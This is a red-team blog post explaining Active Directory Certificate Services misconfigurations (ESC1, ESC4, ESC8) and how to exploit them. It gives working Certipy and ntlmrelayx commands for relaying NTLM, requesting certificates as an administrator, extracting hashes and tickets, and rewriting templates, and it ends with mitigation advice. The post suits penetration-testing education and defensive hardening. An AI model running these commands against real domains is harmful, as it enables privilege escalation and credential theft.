*This blog was meant to be posted on my previous job's blog, unfortunately I was let go on the day it was going to be posted.*

### ADCS Overview

Active Directory Certificate Services (AD CS) is a role in Microsoft Windows Server that enables organizations to issue and manage digital certificates, which are used to secure communications over networks. ADCS is part of the Active Directory domain services, and it allows administrators to create and manage public key infrastructure (PKI) within their organization. ADCS includes tools for certificate enrollment, revocation, and renewal, as well as for managing certificate templates and certificate trust lists. SpecterOps published detailed [research](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)  on the security state of ADCS and how the misconfigurations can lead to privilege escalation or environment persistence.

The goal of this blog post is to present some common scenarios and problems we faced when utilizing attack paths within Active Directory Certificate Services (ADCS) and how to overcome them.

### Concepts and Definitions

- Certification Authority (CA): This is the core component of ADCS, and it is responsible for issuing, revoking, and managing digital certificates. There are different types of CAs, either standalone or enterprise with its own specific role and responsibilities.
- Certificate Templates: These are predefined configurations that specify the parameters and settings for certificates that are issued by the CA. Administrators can create custom templates or use the default templates provided by ADCS.
- Certificate: A certificate is a digitally signed document that is used to verify the identity of a user, device, or application.
- Subject Alternative Name (SAN): One or more additional identities to be associated with a digital certificate.
- Extended Key Usage (EKU): Object identifiers that specifies the intended purposes of a digital certificate.
- Certificate Signing Request (CSR): A request that is sent to a certification authority (CA) to apply for a digital certificate.
- PKINIT: a protocol that is used to establish secure authentication between a client and a server using public key cryptography.

The enrollment process involves the user requesting a certificate with a certificate signing request (CSR) based on a certificate template that is suited to the intended use of the certificate. The CSR is then sent to the certification authority (CA), which will verify that the user is allowed to enroll for a certificate and that the certificate template exists. If these conditions are met, the CA will issue a certificate to the user.


###  Misconfigurations

There several ways to leverage ADCS misconfigurations to maintain persistence or escalate privilege as Penetration Tester/Red Teamer:

One way to gain persistence on a network is by sending the CSR to the CA and obtaining the current user's certificate. With a certificate that is valid for authentication, we can compromise the user even if the password is changed. This is because the certificate is used as an authentication mechanism, so the password is not relevant for that type of authentication (as long as the certificate has not expired). Another way to gain persistence is by extracting a machine account certificate with local administrator right then using it to authenticate as the machine account. As long as the certificate is valid within validity period, we can maintain persistence on the network even after the system changes its password or undergoes a system wipe. The certificate can also be used to obtain user's NTLM hash via a TGT request when authenticating with PKINIT. PKINIT is a protocol that uses public key cryptography to establish secure authentication between a client and a server. Due to a "failsafe" in PKINIT authentication, it is possible to obtain user/machine NTLM hash due to legacy authentication support.

Gaining persistence on the network by having the user or machine account is useful, but being able to escalate their privileges on the network is even better. This can be achieved in several ways, such as by allowing unprivileged users to enroll in a certificate template that enables them to become enrollment agents. An enrollment agent can request a certificate on behalf of another entity, allowing the unprivileged agent to enroll for a certificate with high-privilege user permissions. Another method for enrolling as a different user such as Domain Admin is through the use of SANs (Subject Alternative Names), which allow multiple identities to be associated with a digital certificate (known as ESC1). The Certification Authority (CA) Web Enrollment role service can also be abused. Since the web enrollment service uses HTTP and NTLM authentication, we can coerce an NTLM authentication and relay to the HTTP endpoint to enroll for a certificate (known as ESC8).

### Attack Scenarios
#### ESC 8 - NTLM Relay to AD CS HTTP Endpoints

There are many blogs focused on how to execute a full attack chain from both Linux and Windows machines using Petitpotam to coerce the Domain Controller to authenticate our controlled server and relay the authentication to ADCS HTTP enrollment endpoint. One common problem we encounter is when we get a successful relay to the ADCS HTTP endpoint but receive an 'Error obtaining certificate!' instead.

![[ESC8_1.png]]

This error occurs when the template we enter is incorrect and the default DomainController was not being used. Here we can use [Certipy](https://github.com/ly4k/Certipy) made by Oliver Lyak to find the correct DomainController Template name.

```certipy find -u tevora@domain.local -p 'Longpassword123!' -dc-ip 10.10.10.10 -enabled -stdout```

![[ESC8_2.png]](/assets/img/ADCS/ESC8_2.png)

Noticed the name of the template is DC_Computer. The template command in ntlmrelayx will need to be changed to the corresponded name.

```python3 ntlmrelayx.py -debug -smb2support --target http://CA-SERVER/certsrv/certfnsh.asp --adcs --template DC_Computer```

With the correct template name, the base64 encoded template generates successfully.

![[ESC8_3.png]](/assets/img/ADCS/ESC8_3.png)

Instead of using ntlmrelayx from Impacket, we can use Certipy to achieve the same result.

```certipy relay -ca CA-SERVER -template DC_Computer ```

![[ESC8_4.png]](/assets/img/ADCS/ESC8_4.png)

#### ESC 1 - Misconfigured Certificate Templates

In this scenario, the ESC1 misconfigured certificate template allows domain users to enroll for certificates and impersonate any Active Directory user. The template has 'client authentication' and the 'Enrollee Supplies Subject' set to true which mean the requester can specify a subjectAltName (SAN) that allows additional identities to be associated with the certificate, including a privileged user. Manager approval is not required which mean the request for certificates are automatically approved without any additional checks or verification.

Example ESC 1 vulnerable template:

![[ESC1_1.png]](/assets/img/ADCS/ESC1_1.png)

Request ESC1 vulnerable template with User Principal Name (UPN) ADMIN@DOMAIN.LOCAL

```certipy req -u 'tevora@domain.local -p 'Longpassword123!' -target CA-SERVER.domain.local -template ESC1 -ca CA-SERVER -upn ADMIN@DOMAIN.LOCAL```

![[ESC1_2.png]](/assets/img/ADCS/ESC1_2.png)

Authentication with the admin.pfx we requested to get NTLM hash and Kerberos ticket

```certipy auth -pfx admin.pfx -dc-ip 10.10.10.10```

![[ESC1_3.png]](/assets/img/ADCS/ESC1_3.png)

Recently Certipy will have error "KRB_AP_ERR_BAD_INTEGRITY(Integrity check on decrypted field failed)" when trying to retrieve NTLM or Kerberos ticket.

![[ESC1_4.png]](/assets/img/ADCS/ESC1_4.png)

We can circumvent this by using [PKINITtools](https://github.com/dirkjanm/PKINITtools) as we demonstrated from previous post or we can use the "-ldap-shell" command to authenticate to LDAP and configure Resource-Based Constrained Delegation (RBCD) on a workstation target.

```certipy auth -pfx dc2.pfx -dc-ip 10.10.10.10 -ldap-shell```

![[ESC1_5.png]](/assets/img/ADCS/ESC1_5.png)

#### ESC 4 - Vulnerable Certificate Template Access Control

The ESC4 misconfigured certificate template allows domain users to have write privileges over the template. With permissions FullControl, WriteDacl, WriteOwner, or WriteProperty to the template, it can be abused to overwrite the configuration of the certificate template to make the it vulnerable to ESC1.

Example ESC 4 vulnerable template:

![[ESC4_1.png]](/assets/img/ADCS/ESC4_1.png)


The authenticated users have the write property principles right on the ESC4 template. We are able to reconfigure the ESC4 template adding the 'ENROLLEE_SUPPLIES_SUBJECT' flag and perform ESC1 attack. Make sure to use the -save-old flag to save the template configuration to restore it later.

```certipy template -u 'tevora@domain.local -p 'Longpassword123!' -template ESC4 -dc-ip 10.10.10.10 -save-old```

![[ESC4_2.png]](/assets/img/ADCS/ESC4_2.png)

ESC4 template now has  'ENROLLEE_SUPPLIES_SUBJECT' flag, client authentication , and pretty much everything set to true.

![[ESC4_3.png]](/assets/img/ADCS/ESC4_3.png)

We can perform ESC1 attack as we did earlier and make sure to restore the template back to the original state.

```certipy template -u 'tevora@domain.local -p 'Longpassword123!' -template ESC4 -dc-ip 10.10.10.10 -configuration ESC4.json```

![[ESC4_4.png]](/assets/img/ADCS/ESC4_4.png)

### Mitigation and wrap-up

- ESC1: Remove the “ENROLLEE_SUPPLIES_SUBJECT” flag will prevent certificates from being requested by any domain account. If the flag cannot be removed, the certificate approval management must be activated (CA Certificate Manager Approval) before the certificate is issued, and not allow "AutoEnrollment" by default.
- ESC4: Review the ACLs on the templates and remove unnecessary access rights.
- ESC8: Disable NTLM authentication and HTTP endpoint. Otherwise, only allow HTTPS traffic and configure Extended Protection for Authentication (EPA).

Misconfigured ADCS is one of the most frequently exploited vulnerability in 2022, with Penetration Tester/Red Teamer utilizing these scenarios to escalate privileges on internal networks after an initial foothold. In order to prevent future exploitation on these vulnerabilities is to properly configure ADCS and ensure that all certificates are properly managed and configured. This may require regular audits and updates to certificate policies, as well as strict access controls to prevent unauthorized users from obtaining or manipulating certificates.
